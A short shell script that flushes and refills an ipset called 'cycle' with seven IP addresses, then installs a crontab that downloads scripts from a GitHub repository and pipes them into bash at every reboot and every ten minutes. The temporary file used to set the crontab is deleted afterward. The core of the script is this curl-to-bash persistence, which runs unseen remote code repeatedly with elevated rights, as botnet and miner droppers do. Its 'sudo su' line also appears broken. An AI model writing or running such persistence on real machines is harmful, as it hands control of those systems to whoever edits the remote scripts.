#!/bin/sh
sudo su
ipset flush cycle
ipset add cycle 18.119.29.38
ipset add cycle 3.17.175.81
ipset add cycle 3.145.56.41
ipset add cycle 18.222.184.162
ipset add cycle 3.144.30.235
ipset add cycle 3.15.223.82
ipset add cycle 3.138.116.158
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/inreload.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/Ho012.sh | bash
 " >> myverifier
sudo crontab myverifier
rm myverifier
